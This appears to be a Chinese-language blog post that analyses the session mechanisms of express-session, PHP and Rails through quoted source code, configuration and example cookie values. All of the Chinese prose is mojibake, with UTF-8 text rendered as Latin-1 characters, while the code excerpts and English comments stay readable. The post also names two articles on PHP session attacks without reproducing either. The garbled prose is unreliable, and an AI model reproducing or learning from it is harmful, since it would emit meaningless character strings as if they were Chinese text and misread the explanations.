ä»¥ä¸Šé¢çš„ç¯„ä¾‹ä¾†èªªï¼Œhello åˆ©ç”¨ tobiiscool é€™å€‹ secretï¼Œå¾—åˆ°çš„çµæœç‚ºï¼šDGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QIï¼Œæ–¼æ˜¯å®Œæ•´å­—ä¸²å°±è®Šç‚ºï¼šhello.DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QIï¼Œå‰é¢æ˜¯æˆ‘çš„è³‡æ–™ï¼Œå¾Œé¢æ˜¯è³‡æ–™çš„é‘‘åˆ¥ç¢¼ã€‚
å¦‚æœæœ‰äººæƒ³ç«„æ”¹è³‡æ–™ï¼Œä¾‹å¦‚èªªæŠŠå‰é¢æ”¹æˆ hello2ï¼Œé‚£é€™å€‹è³‡æ–™çš„é‘‘åˆ¥ç¢¼å°±ä¸æœƒæ˜¯å¾Œé¢é‚£ä¸€ä¸²ï¼Œæˆ‘å°±çŸ¥é“æœ‰äººç¯¡æ”¹è³‡æ–™äº†ã€‚æ‰€ä»¥è—‰ç”±é€™æ¨£çš„æ–¹å¼ä¾†ä¿æŒè³‡æ–™å®Œæ•´æ€§ï¼Œå…¶å¯¦åŸç†è·Ÿ JWT æ˜¯å·®ä¸å¤šçš„ï¼Œä½ çœ‹å¾—åˆ°è³‡æ–™ä½†æ²’è¾¦æ³•æ”¹å®ƒï¼Œå› ç‚ºæ”¹äº†æœƒè¢«ç™¼ç¾ã€‚
ä½ å¯èƒ½æœƒç–‘æƒ‘èªªï¼šé‚£æˆ‘å¹¹å˜›ä¸æŠŠæ•´å€‹ sessionID åŠ å¯†å°±å¥½ï¼Ÿç‚ºä»€éº¼è¦å¤šæ­¤ä¸€èˆ‰ç”¨é€™ç¨®æ–¹å¼ï¼Ÿæˆ‘è‡ªå·±çŒœæ¸¬æ˜¯å› ç‚ºåŸå§‹è³‡æ–™å…¶å¯¦ä¸æ€•åˆ¥äººçœ‹ï¼Œåªæ˜¯æ€•äººæ”¹è€Œå·²ï¼›è‹¥æ˜¯åŸå§‹è³‡æ–™æ˜¯æ•æ„Ÿè³‡è¨Šï¼Œæœƒç”¨åŠ å¯†çš„æ–¹å¼ã€‚ä½†å› ç‚ºåŸå§‹è³‡æ–™åªæ˜¯ sessionID è€Œå·²ï¼Œè¢«åˆ¥äººçœ‹åˆ°ä¹Ÿæ²’ä»€éº¼é—œä¿‚ï¼Œåªè¦ä¿éšœè³‡æ–™å®Œæ•´æ€§å³å¯ã€‚è€Œä¸”åŠ å¯†éœ€è¦çš„ç³»çµ±è³‡æºæ‡‰è©²æ¯”é€™ç¨®è¨Šæ¯é©—è­‰é‚„å¤šï¼Œå› æ­¤æ‰æ¡ç”¨é€™ç¨®æ–¹å¼ã€‚
å¥½ï¼Œæˆ‘å€‘å†è¬›å›ä¾†å‰é¢ï¼Œæ‰€ä»¥ express-session æœƒæŠŠ sessionID å­˜åœ¨ cookie è£¡é¢ï¼Œkey æ˜¯ connect.sidï¼Œvalue å‰‡æ˜¯ s:&#123;sessionID&#125;.&#123;hmac-sha256(sessionID, secret)&#125;ã€‚
å¥½å¥‡çš„è©±ä½ å¯ä»¥å»ä»»ä½•ä½¿ç”¨ Express çš„ç¶²ç«™ç„¶å¾Œçœ‹ä¸€ä¸‹ cookie å…§å®¹ï¼Œå°±å¯ä»¥æ‰¾åˆ°å¯¦éš›çš„è³‡æ–™ï¼ˆæˆ–æ˜¯è‡ªå·±éš¨ä¾¿åŸ·è¡Œä¸€å€‹ä¹Ÿè¡Œï¼‰ï¼Œé€™é‚Šæˆ‘ç”¨æˆ‘çš„ç•¶ä½œç¯„ä¾‹ï¼Œæˆ‘çš„ connect.sid æ˜¯ï¼š s%3AfZZVCDHefchle2LDK4PzghaR3Ao9NruG.J%2BsOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRMï¼ŒæŠŠç‰¹æ®Šå­—å…ƒ decode ä¹‹å¾Œè®Šæˆï¼š s:fZZVCDHefchle2LDK4PzghaR3Ao9NruG.J+sOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRMã€‚
ä¹Ÿå°±æ˜¯èªªæˆ‘çš„ sessionID æ˜¯fZZVCDHefchle2LDK4PzghaR3Ao9NruGï¼Œé‘‘åˆ¥ç¢¼æ˜¯J+sOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRMã€‚
çŸ¥é“å„²å­˜ sessionID çš„æ–¹å¼ä»¥å¾Œï¼Œå¾ cookie è£¡é¢å–å¾— sessionID çš„æ–¹å¼æ‡‰è©²ä¹Ÿèƒ½çœ‹æ‡‚ï¼Œå°±æ˜¯æŠŠäº‹æƒ…åéä¾†åšè€Œå·²ï¼š
// get the session ID from the cookievar cookieId = req.sessionID = getcookie(req, name, secrets);  function getcookie(req, name, secrets) &#123;  var header = req.headers.cookie;  var raw;  var val;    // read from cookie header  if (header) &#123;    var cookies = cookie.parse(header);      raw = cookies[name];      if (raw) &#123;      if (raw.substr(0, 2) === &#x27;s:&#x27;) &#123;        val = unsigncookie(raw.slice(2), secrets);        if (val === false) &#123;          debug(&#x27;cookie signature invalid&#x27;);          val = undefined;        &#125;      &#125; else &#123;        debug(&#x27;cookie unsigned&#x27;)      &#125;    &#125;  &#125;    return val;&#125;  /** * Verify and decode the given `val` with `secrets`. * * @param &#123;String&#125; val * @param &#123;Array&#125; secrets * @returns &#123;String|Boolean&#125; * @private */function unsigncookie(val, secrets) &#123;  for (var i = 0; i &lt; secrets.length; i++) &#123;    var result = signature.unsign(val, secrets[i]);      if (result !== false) &#123;      return result;    &#125;  &#125;    return false;&#125;

æ¥ä¸‹ä¾†å°±å‰©æœ€å¾Œä¸€å€‹äº†ï¼Œsession è³‡è¨Šåˆ°åº•å­˜åœ¨å“ªè£¡ï¼Ÿæ˜¯å­˜åœ¨è¨˜æ†¶é«”ã€æª”æ¡ˆï¼Œé‚„æ˜¯å…¶ä»–åœ°æ–¹ï¼Ÿ
å…¶å¯¦é€™å€‹åœ¨ç¨‹å¼ç¢¼è£¡é¢å¯«å¾—å¾ˆæ¸…æ¥šäº†ï¼Œé è¨­æ˜¯å­˜åœ¨è¨˜æ†¶é«”è£¡é¢çš„ï¼š
var warning = &#x27;Warning: connect.session() MemoryStore is not\n&#x27;  + &#x27;designed for a production environment, as it will leak\n&#x27;  + &#x27;memory, and will not scale past a single process.&#x27;;  // get the session storevar store = opts.store || new MemoryStore()  // notify user that this store is not// meant for a production environment/* istanbul ignore next: not tested */if (env === &#x27;production&#x27; &amp;&amp; store instanceof MemoryStore) &#123;  console.warn(warning);&#125;

é‚£åˆ°åº•æ˜¯æ€éº¼å­˜å‘¢ï¼Ÿå¯ä»¥åƒè€ƒ session&#x2F;memory.jsï¼š
function MemoryStore() &#123;  Store.call(this)  this.sessions = Object.create(null)&#125;  MemoryStore.prototype.get = function get(sessionId, callback) &#123;  defer(callback, null, getSession.call(this, sessionId))&#125;  MemoryStore.prototype.set = function set(sessionId, session, callback) &#123;  this.sessions[sessionId] = JSON.stringify(session)  callback &amp;&amp; defer(callback)&#125;  function getSession(sessionId) &#123;  var sess = this.sessions[sessionId]    if (!sess) &#123;    return  &#125;    // parse  sess = JSON.parse(sess)    return sess&#125;

é¦–å…ˆç”¨ Object.create(null) å‰µé€ å‡ºä¸€å€‹ä¹¾æ·¨çš„ Objectï¼ˆé€™æ˜¯å¾ˆå¸¸ç”¨çš„ä¸€å€‹æ–¹æ³•ï¼Œæ²’çœ‹éçš„å¯ä»¥åƒè€ƒï¼šè©³è§£ Object.create(null)ï¼‰ï¼Œç„¶å¾Œä»¥ sessionID ä½œç‚º keyï¼ŒJSON.stringigy(session)ä½œç‚º valueï¼Œå­˜åˆ°é€™å€‹ object è£¡é¢ã€‚
æ‰€ä»¥èªªç©¿äº†å…¶å¯¦ express-session çš„ session information é è¨­å°±æ˜¯å­˜åœ¨ä¸€å€‹è®Šæ•¸è£¡é¢è€Œå·²å•¦ï¼Œå› æ­¤ä½ åªè¦ä¸€æŠŠ process çµæŸæ‰é‡é–‹ï¼Œsession çš„è³‡æ–™å°±éƒ½å…¨éƒ¨ä¸è¦‹äº†ã€‚è€Œä¸”æœƒæœ‰ memory leak çš„å•é¡Œï¼Œæ‰€ä»¥å®˜æ–¹ä¹Ÿä¸æ¨è–¦ç”¨åœ¨ production ä¸Šé¢ã€‚
å¦‚æœè¦ç”¨åœ¨ production ä¸Šé¢ï¼Œå¿…é ˆé¡å¤–å†æ‰¾storeä¾†ç”¨ï¼Œä¾‹å¦‚èªª connect-redis å°±å¯ä»¥è·Ÿ express-session æ­é…ï¼ŒæŠŠ session information å­˜åœ¨ redis è£¡ã€‚
ä»¥ä¸Šå°±æ˜¯ Express å¸¸ç”¨çš„ middlewareï¼šexpress-session çš„åŸå§‹ç¢¼åˆ†æã€‚å¾ä¸Šé¢çš„æ®µè½æˆ‘å€‘æ¸…æ¥šçŸ¥é“äº† sessionID çš„ç”¢ç”Ÿæ–¹å¼ä»¥åŠå¦‚ä½•å­˜åœ¨ cookieï¼Œé‚„æœ‰ session information æ‰€å„²å­˜çš„åœ°æ–¹ã€‚
PHPï¼ˆ7.2 ç‰ˆæœ¬ï¼‰PHP å…§å»ºå°±æœ‰ session æ©Ÿåˆ¶ï¼Œä¸å¿…ä½¿ç”¨ä»»ä½•çš„ frameworkï¼Œè€Œä½¿ç”¨çš„æ–¹æ³•ä¹Ÿå¾ˆç°¡å–®ï¼š
&lt;?phpsession_start();  if (empty($_SESSION[&#x27;views&#x27;])) &#123;    $_SESSION[&#x27;views&#x27;] = 1;&#125; else &#123;    $_SESSION[&#x27;views&#x27;]++;&#125;  echo $_SESSION[&#x27;views&#x27;];?&gt;

å…¶å¯¦è·Ÿ express-session çš„ç”¨æ³•æœ‰é»åƒï¼Œåªæ˜¯ä¸€å€‹æ˜¯ req.sessionï¼Œä¸€å€‹æ˜¯$_SESSIONã€‚
æˆ‘åŸæœ¬ä¹Ÿæƒ³è·Ÿå‰›å‰›çœ‹ express-session ä¸€æ¨£ï¼Œç›´æ¥å»çœ‹ PHP çš„åŸå§‹ç¢¼ï¼Œç„¶å¾Œå¾ä¸­ç™¼ç¾å¦‚ä½•å¯¦ä½œã€‚ä½†å› ç‚º PHP çš„åŸå§‹ç¢¼å…¨éƒ¨éƒ½æ˜¯ Cï¼Œå°æˆ‘é€™ç¨®å¹¾ä¹æ²’å¯«é C çš„äººä¾†èªªå¾ˆé›£çœ‹æ‡‚ï¼Œå› æ­¤æˆ‘ä¹Ÿåªèƒ½åéä¾†ã€‚å…ˆè·Ÿå¤§å®¶ä»‹ç´¹ PHP çš„ Session æ©Ÿåˆ¶æ˜¯å¦‚ä½•å¯¦ä½œçš„ï¼Œå†å¾åŸå§‹ç¢¼è£¡é¢å»æ‰¾è­‰æ“šæ”¯æ´ã€‚
é¦–å…ˆå‘¢ï¼ŒPHP çš„ Session æ©Ÿåˆ¶èˆ‡ express-session å·®ä¸å¤šï¼Œéƒ½æœƒåœ¨ Cookie è£¡å­˜æ”¾ä¸€å€‹ sessionIDï¼Œä¸¦ä¸”æŠŠ session information å­˜åœ¨ä¼ºæœå™¨ã€‚express-session é è¨­æ˜¯å­˜åœ¨è¨˜æ†¶é«”ï¼ŒPHP é è¨­å‰‡æ˜¯å­˜åœ¨æª”æ¡ˆè£¡é¢ã€‚
ä»¥ä¸Šé€™äº›éƒ½å¯ä»¥åœ¨ PHP çš„è¨­å®šæª”èª¿æ•´ï¼Œéƒ½å¯«åœ¨ php.ini è£¡é¢ï¼Œåº•ä¸‹ä»¥æˆ‘çš„ç‚ºä¾‹ï¼Œåˆ—å‡ºä¸€äº›ç›¸é—œçš„è¨­å®šï¼š
[Session]; Handler used to store/retrieve data.; http://php.net/session.save-handlersession.save_handler=files  ; Argument passed to save_handler.  In the case of files, this is the path; where data files are stored. Note: Windows users have to change this; variable in order to use PHP&#x27;s session functions.;; The path can be defined as:;;     session.save_path = &quot;N;/path&quot;  session.save_path=&quot;/opt/lampp/temp/&quot;  ; Name of the session (used as cookie name).; http://php.net/session.namesession.name=PHPSESSID  ; Handler used to serialize data.  php is the standard serializer of PHP.; http://php.net/session.serialize-handlersession.serialize_handler=php

åœ¨ Cookie è£¡é¢ä½ å°±èƒ½çœ‹è¦‹ä¸€å€‹ PHPSESSIDï¼Œå€¼å¤§æ¦‚é•·å¾—åƒé€™æ¨£ï¼šfc46356f83dcf5712205d78c51b47c4dï¼Œé€™å°±æ˜¯ PHP æ‰€ä½¿ç”¨çš„ sessionIDã€‚
æ¥è‘—ä½ å» session.save_path çœ‹ï¼Œå°±æœƒçœ‹åˆ°å„²å­˜ä½  session è³‡è¨Šçš„æª”æ¡ˆï¼Œæª”åå¾ˆå¥½èªï¼Œå°±æ˜¯ sess_ åŠ ä¸Š sessionIDï¼š
root@debian:/opt/lampp/temp# ls  adminer.invalidadminer.versionsess_04719a35fb67786d574ec6eca969f7cbsess_fc46356f83dcf5712205d78c51b47c4d

è‹¥æ˜¯æ‰“é–‹ session æª”æ¡ˆï¼Œå…§å®¹æœƒæ˜¯è¢«åºåˆ—åŒ–ï¼ˆserializeï¼‰ä¹‹å¾Œçš„çµæœï¼š
views|i:5;

é€™å°±æ˜¯ PHP session çš„çœŸé¢ç›®äº†ã€‚æŠŠ session information å…¨éƒ½å­˜åœ¨æª”æ¡ˆè£¡é¢ã€‚
è‹¥æ˜¯æƒ³è¦ç ”ç©¶ PHP session çš„ç›¸é—œåŸå§‹ç¢¼ï¼Œæœ€é‡è¦çš„æª”æ¡ˆå°±æ˜¯é€™å…©å€‹ï¼šext&#x2F;session&#x2F;session.c è·Ÿ ext&#x2F;session&#x2F;mod_files.cï¼Œå‰è€…ç®¡ç† session ç”Ÿå‘½é€±æœŸï¼Œå¾Œè€…è² è²¬æŠŠ session å¯¦éš›å­˜åˆ°æª”æ¡ˆè£¡é¢æˆ–è€…æ˜¯è®€å‡ºä¾†ã€‚å¾Œè€…å…¶å¯¦å°±å¾ˆåƒæˆ‘å€‘åœ¨ express-session è£¡é¢çœ‹åˆ°çš„ Storeï¼Œåªè¦éµå®ˆä¸€æ¨£çš„ interfaceï¼Œå°±å¯ä»¥è‡ªå·±å¯«ä¸€å€‹å…¶ä»–çš„ mod å‡ºä¾†ï¼Œä¾‹å¦‚èªª mod_redis.c ä¹‹é¡çš„ã€‚
æ¥è‘—æˆ‘å€‘ä¸€æ¨£å…ˆä¾†æ‰¾æ‰¾çœ‹ sessionID æ˜¯å¦‚ä½•ç”¢ç”Ÿçš„ï¼Œå¯ä»¥ç›´æ¥åœ¨ mod_files.c æœå°‹ç›¸é—œå­—çœ¼ï¼Œå°±æœƒæ‰¾åˆ°åº•ä¸‹é€™æ®µï¼š
/* * Create session ID. * PARAMETERS: PS_CREATE_SID_ARGS in php_session.h * RETURN VALUE: Valid session ID(zend_string *) or NULL for FAILURE. * * PS_CREATE_SID_FUNC() must check collision. i.e. Check session data if * new sid exists already. * *mod_data is guaranteed to have non-NULL value. * NOTE: Default php_session_create_id() does not check collision. If * NULL is returned, session module create new ID by using php_session_create_id(). * If php_session_create_id() fails due to invalid configuration, it raises E_ERROR. * NULL return value checks from php_session_create_id() is not required generally. */PS_CREATE_SID_FUNC(files)&#123;    zend_string *sid;    int maxfail = 3;    PS_FILES_DATA;      do &#123;        sid = php_session_create_id((void**)&amp;data);        if (!sid) &#123;            if (--maxfail &lt; 0) &#123;                return NULL;            &#125; else &#123;                continue;            &#125;        &#125;        /* Check collision */        /* FIXME: mod_data(data) should not be NULL (User handler could be NULL) */        if (data &amp;&amp; ps_files_key_exists(data, ZSTR_VAL(sid)) == SUCCESS) &#123;            if (sid) &#123;                zend_string_release(sid);                sid = NULL;            &#125;            if (--maxfail &lt; 0) &#123;                return NULL;            &#125;        &#125;    &#125; while(!sid);      return sid;&#125;

é€™é‚Šå‘¼å«äº† php_session_create_id ä¾†ç”¢ç”Ÿ sessionIDï¼Œç„¶å¾Œæœƒæª¢æŸ¥æœ‰æ²’æœ‰ç”¢ç”Ÿé‡è¤‡çš„ idï¼Œæœ‰çš„è©±å°±é‡è©¦æœ€å¤šä¸‰æ¬¡ã€‚è€Œ php_session_create_id å‰‡æ˜¯å­˜åœ¨æ–¼ session.c é‚£å€‹æª”æ¡ˆï¼š
#define PS_EXTRA_RAND_BYTES 60  PHPAPI zend_string *php_session_create_id(PS_CREATE_SID_ARGS) /* &#123;&#123;&#123; */&#123;    unsigned char rbuf[PS_MAX_SID_LENGTH + PS_EXTRA_RAND_BYTES];    zend_string *outid;      /* Read additional PS_EXTRA_RAND_BYTES just in case CSPRNG is not safe enough */    if (php_random_bytes_throw(rbuf, PS(sid_length) + PS_EXTRA_RAND_BYTES) == FAILURE) &#123;        return NULL;    &#125;      outid = zend_string_alloc(PS(sid_length), 0);    ZSTR_LEN(outid) = bin_to_readable(rbuf, PS(sid_length), ZSTR_VAL(outid), (char)PS(sid_bits_per_character));      return outid;&#125;

é‡é»å…¶å¯¦åªæœ‰é€™ä¸€å€‹ï¼šphp_random_bytes_throwï¼Œé€™å€‹ function å¦‚æœç¹¼çºŒè¿½ä¸‹å»æœƒæ‰¾åˆ° ext&#x2F;standard&#x2F;php_random.hï¼Œç„¶å¾Œæ‰¾åˆ° ext&#x2F;standard&#x2F;random.cï¼Œæ‰æ˜¯çœŸæ­£ç”¢ç”Ÿéš¨æ©Ÿæ•¸çš„åœ°æ–¹ã€‚
ä½†æœ€å¾Œæ‰¾åˆ°çš„é‚£å€‹ function æƒ³è¦çœ‹æ‡‚å¿…é ˆèŠ±ä¸€å¤§æ®µæ™‚é–“ï¼Œå› æ­¤æˆ‘å°±æ²’æœ‰ç´°çœ‹äº†ã€‚ç¸½ä¹‹åœ¨ä¸åŒä½œæ¥­ç³»çµ±ä¸Šæœƒæœ‰ä¸åŒçš„ç”¢ç”Ÿæ–¹å¼ï¼Œå…¶ä¸­ä¸€ç¨®é‚„æœƒä½¿ç”¨åˆ° &#x2F;dev&#x2F;urandomã€‚
çŸ¥é“äº† sessionID çš„ç”¢ç”Ÿæ–¹å¼ä»¥å¾Œï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹ PHP çš„ session information æ˜¯æ€éº¼åš serialize çš„ã€‚å¯ä»¥åœ¨å®˜æ–¹æ–‡ä»¶ä¸Šçœ‹åˆ°ä¸€å€‹ function å«åšï¼šsession_encodeï¼Œè¼¸å‡ºçš„çµæœè·Ÿæˆ‘å€‘åœ¨ session æª”æ¡ˆè£¡é¢çœ‹åˆ°çš„è³‡æ–™ä¸€æ¨¡ä¸€æ¨£ï¼Œè€Œé€™å€‹ function çš„æ•˜è¿°å¯«è‘—ï¼š

session_encode() returns a serialized string of the contents of the current session data stored in the $_SESSION superglobal.


By default, the serialization method used is internal to PHP, and is not the same as serialize(). The serialization method can be set using session.serialize_handler.

æ¥è‘—æˆ‘å€‘ç›´æ¥åœ¨ session.c è£¡é¢æœå°‹session_encodeï¼Œæœƒæ‰¾åˆ°é€™ä¸€æ®µï¼š
/* &#123;&#123;&#123; proto string session_encode(void)   Serializes the current setup and returns the serialized representation */static PHP_FUNCTION(session_encode)&#123;    zend_string *enc;      if (zend_parse_parameters_none() == FAILURE) &#123;        return;    &#125;      enc = php_session_encode();    if (enc == NULL) &#123;        RETURN_FALSE;    &#125;      RETURN_STR(enc);&#125;

åªæ˜¯ä¸€å€‹ php_session_encode çš„ wrapper è€Œå·²ï¼Œè€Œä¸” php_session_encode ä¹Ÿåªæ˜¯å†å‘¼å«åˆ¥çš„æ±è¥¿ï¼š
static zend_string *php_session_encode(void) /* &#123;&#123;&#123; */&#123;    IF_SESSION_VARS() &#123;        if (!PS(serializer)) &#123;            php_error_docref(NULL, E_WARNING, &quot;Unknown session.serialize_handler. Failed to encode session object&quot;);            return NULL;        &#125;        return PS(serializer)-&gt;encode();    &#125; else &#123;        php_error_docref(NULL, E_WARNING, &quot;Cannot encode non-existent session&quot;);    &#125;    return NULL;&#125;/* &#125;&#125;&#125; */

return PS(serializer)-&gt;encode(); é€™ä¸€å¥æ‰æ˜¯é‡é»ã€‚å…¶å¯¦è¿½åˆ°é€™é‚Šçš„æ™‚å€™å°±æœ‰é»å¡ä½ï¼Œå› ç‚ºä¸æ¸…æ¥šé€™é‚Šçš„ serializer æ˜¯å¾å“ªé‚Šä¾†çš„ã€‚ä½†å¾€ä¸‹ç¨å¾®çœ‹ä¸€ä¸‹ç¨‹å¼ç¢¼ï¼Œæ‰¾åˆ°ä¸€æ®µæ‡‰è©²æ˜¯ç›¸é—œçš„ï¼š
#define PS_DELIMITER &#x27;|&#x27;  PS_SERIALIZER_ENCODE_FUNC(php) /* &#123;&#123;&#123; */&#123;    smart_str buf = &#123;0&#125;;    php_serialize_data_t var_hash;    PS_ENCODE_VARS;      PHP_VAR_SERIALIZE_INIT(var_hash);      PS_ENCODE_LOOP(        smart_str_appendl(&amp;buf, ZSTR_VAL(key), ZSTR_LEN(key));        if (memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))) &#123;            PHP_VAR_SERIALIZE_DESTROY(var_hash);            smart_str_free(&amp;buf);            return NULL;        &#125;        smart_str_appendc(&amp;buf, PS_DELIMITER);        php_var_serialize(&amp;buf, struc, &amp;var_hash);    );      smart_str_0(&amp;buf);      PHP_VAR_SERIALIZE_DESTROY(var_hash);    return buf.s;&#125;/* &#125;&#125;&#125; */

æœƒçŸ¥é“ç›¸é—œæ˜¯å› ç‚º #define PS_DELIMITER &#39;|&#39; é€™ä¸€è¡Œï¼Œé€™å€‹ç¬¦è™Ÿåœ¨ session æª”æ¡ˆè£¡æœ‰å‡ºç¾ï¼Œå¯ä»¥çŒœæ¸¬æ‡‰è©²æ˜¯æ‹¿ä¾†åˆ†éš”ä»€éº¼æ±è¥¿çš„ã€‚è€Œå¯¦éš›çš„å€¼å‰‡æ˜¯äº¤çµ¦php_var_serializeè™•ç†ã€‚
php_var_serializeè‹¥æ˜¯ç¹¼çºŒå¾€ä¸‹è¿½ï¼Œå¯ä»¥æ‰¾åˆ° ext&#x2F;standard&#x2F;var.cï¼ˆç›´æ¥ç”¨ GitHub æœå°‹åŠŸèƒ½å°±å¯ä»¥æ‰¾åˆ°é€™å€‹æª”æ¡ˆï¼Œæœå°‹åŠŸèƒ½è¶…æ–¹ä¾¿çš„ï¼‰ï¼Œæœ€å¾Œå°±æœƒæ‰¾åˆ°çœŸæ­£åœ¨è™•ç†çš„åœ°æ–¹ï¼šphp_var_serialize_internï¼Œè£¡é¢æœƒé‡å°ä¸åŒçš„å½¢æ…‹å»å‘¼å«ä¸åŒçš„ functionã€‚
ä»¥æˆ‘å€‘ä¹‹å‰å­˜åœ¨ session è£¡é¢çš„ views ä¾†èªªï¼Œæ˜¯ä¸€å€‹æ•¸å­—ï¼Œæ‰€ä»¥æœƒè·‘åˆ°é€™å€‹ functionï¼š
static inline void php_var_serialize_long(smart_str *buf, zend_long val) /* &#123;&#123;&#123; */&#123;    smart_str_appendl(buf, &quot;i:&quot;, 2);    smart_str_append_long(buf, val);    smart_str_appendc(buf, &#x27;;&#x27;);&#125;/* &#125;&#125;&#125; */

è¿½åˆ°é€™é‚Šï¼Œå°±çŸ¥é“ç‚ºä»€éº¼ç•¶åˆ session åºåˆ—åŒ–ä¹‹å¾Œçš„çµæœæ˜¯views|i:5;äº†ã€‚|æ‹¿ä¾†åˆ†éš” key è·Ÿ valueï¼Œi ä»£è¡¨è‘—å‹æ…‹ï¼Œ5 ä»£è¡¨å¯¦éš›çš„æ•¸å­—ï¼Œ; å‰‡æ˜¯çµæŸç¬¦è™Ÿã€‚
ä»¥ä¸Šå°±æ˜¯ PHP Session æ©Ÿåˆ¶çš„ç›¸é—œåŸå§‹ç¢¼åˆ†æï¼Œæˆ‘å€‘ç¨å¾®çœ‹äº†å¦‚ä½•ç”¢ç”Ÿ sessionID ä»¥åŠ session information å¦‚ä½•åšåºåˆ—åŒ–ã€‚ä¹ŸçŸ¥é“äº†ä»¥é è¨­çš„ç‹€æ…‹ä¾†èªªï¼Œcookie åç¨±æœƒå«åš PHPSESSIDï¼Œè€Œä¸”æœƒä»¥æª”æ¡ˆçš„æ–¹å¼ä¾†å„²å­˜ session çš„å…§å®¹ã€‚
æœ€å¾Œä¾†åˆ†äº«å…©å€‹è·Ÿ PHP Session æœ‰é—œçš„æ–‡ç« ï¼Œéƒ½ååˆ†æœ‰è¶£ï¼š

HITCON CTF 2018 - One Line PHP Challenge
[Web Security] é€é LFI å¼•å…¥ PHP session æª”æ¡ˆè§¸ç™¼ RCE

Railsï¼ˆ5.2 ç‰ˆæœ¬ï¼‰Rails æ˜¯ä¸€å€‹ Ruby çš„ Web æ¡†æ¶ï¼Œä¿—ç¨± Ruby on Railsã€‚æœƒæŒ‘é€™ä¸€å¥—æ˜¯å› ç‚ºæˆ‘æœ¬ä¾†å°±çŸ¥é“å®ƒå„²å­˜ session çš„æ–¹æ³•ä¸å¤ªä¸€æ¨£ã€‚æˆ‘ç•¶åˆåªæ˜¯å¥½å¥‡ Rails æ€éº¼ç”Ÿæˆ sessionID çš„ï¼Œæ–¼æ˜¯å°±å» GitHub çš„ repo æœå°‹ï¼šsessionï¼Œç„¶å¾Œæ‰¾åˆ°é€™å€‹æª”æ¡ˆï¼šrails&#x2F;actionpack&#x2F;test&#x2F;dispatch&#x2F;session&#x2F;cookie_store_test.rbï¼Œæ˜¯å€‹æ¸¬è©¦ï¼Œä½†æœ‰æ™‚å€™æ¸¬è©¦å…¶å¯¦å°æ‰¾ç¨‹å¼ç¢¼å¹«åŠ©ä¹Ÿå¾ˆå¤§ï¼Œå› ç‚ºè£¡é¢æœƒå‡ºç¾ä¸€å †ç›¸é—œçš„ function è·Ÿåƒæ•¸ã€‚
æˆ‘é‚£æ™‚è§€å¯Ÿäº†ä¸€é™£å­ï¼Œç™¼ç¾è£¡é¢å‡ºç¾äº†å¾ˆå¤šæ¬¡çš„ session_idï¼Œæ–¼æ˜¯å°±æ”¹ç”¨é€™å€‹é—œéµå­—æœå°‹ï¼Œæ‰¾åˆ°äº† rails&#x2F;actionpack&#x2F;lib&#x2F;action_dispatch&#x2F;middleware&#x2F;session&#x2F;cookie_store.rbï¼Œç™¼ç¾è£¡é¢çš„è¨»è§£æŠŠ Rails çš„ Session å¯¦ä½œæ–¹å¼å¯«å¾—ä¸€æ¸…äºŒæ¥šï¼š
# This cookie-based session store is the Rails default. It is# dramatically faster than the alternatives.## Sessions typically contain at most a user_id and flash message; both fit# within the 4K cookie size limit. A CookieOverflow exception is raised if# you attempt to store more than 4K of data.## The cookie jar used for storage is automatically configured to be the# best possible option given your application&#x27;s configuration.## If you only have secret_token set, your cookies will be signed, but# not encrypted. This means a user cannot alter their +user_id+ without# knowing your app&#x27;s secret key, but can easily read their +user_id+. This# was the default for Rails 3 apps.## Your cookies will be encrypted using your apps secret_key_base. This# goes a step further than signed cookies in that encrypted cookies cannot# be altered or read by users. This is the default starting in Rails 4.## Configure your session store in &lt;tt&gt;config/initializers/session_store.rb&lt;/tt&gt;:##   Rails.application.config.session_store :cookie_store, key: &#x27;_your_app_session&#x27;## In the development and test environments your application&#x27;s secret key base is# generated by Rails and stored in a temporary file in &lt;tt&gt;tmp/development_secret.txt&lt;/tt&gt;.# In all other environments, it is stored encrypted in the# &lt;tt&gt;config/credentials.yml.enc&lt;/tt&gt; file.## If your application was not updated to Rails 5.2 defaults, the secret_key_base# will be found in the old &lt;tt&gt;config/secrets.yml&lt;/tt&gt; file.## Note that changing your secret_key_base will invalidate all existing session.# Additionally, you should take care to make sure you are not relying on the# ability to decode signed cookies generated by your app in external# applications or JavaScript before changing it.## Because CookieStore extends Rack::Session::Abstract::Persisted, many of the# options described there can be used to customize the session cookie that# is generated. For example:##   Rails.application.config.session_store :cookie_store, expire_after: 14.days## would set the session cookie to expire automatically 14 days after creation.# Other useful options include &lt;tt&gt;:key&lt;/tt&gt;, &lt;tt&gt;:secure&lt;/tt&gt; and# &lt;tt&gt;:httponly&lt;/tt&gt;.

Rails é è¨­ä½¿ç”¨ cookie-based sessionï¼Œå› ç‚ºå®ƒæ¯”å…¶ä»–è§£æ±ºæ–¹æ¡ˆéƒ½ä¾†å¾—å¿«ã€‚é›–ç„¶ cookie æœ‰å¤§å°é™åˆ¶ï¼Œä½†é ‚å¤šåªæœƒå­˜ flash message è·Ÿ user_idï¼Œé›¢ 4k çš„ä¸Šé™é‚„æœ‰ä¸€å¤§æ®µè·é›¢ã€‚
åœ¨ Rails 3 è£¡é¢ cookie åªæœƒè¢« signed ä¸æœƒè¢«åŠ å¯†ï¼Œæ„æ€å°±æ˜¯ä½¿ç”¨è€…çœ‹å¾—åˆ° user_id ä½†æ²’è¾¦æ³•æ”¹å®ƒï¼ˆå°±åƒæˆ‘å€‘åœ¨ express-session çœ‹åˆ°çš„ sessionID ä¸€æ¨£ï¼Œçœ‹å¾—åˆ°ä½†ä¸èƒ½æ”¹ï¼‰ã€‚
è€Œ Rails 4 ä»¥å¾Œé è¨­å°±æœƒæŠŠ cookie çš„å€¼æ•´å€‹åŠ å¯†ï¼Œä»€éº¼éƒ½çœ‹ä¸åˆ°ã€‚åœ¨æ¸¬è©¦ç’°å¢ƒæ™‚ Rails æœƒè‡ªå‹•å¹«ä½ ç”¢ç”Ÿä¸€å€‹ secret ä¾†åŠ å¯†ï¼Œä¹Ÿå¯ä»¥é€é Rails çš„è¨­å®šæª”ä¾†è¨­å®šã€‚
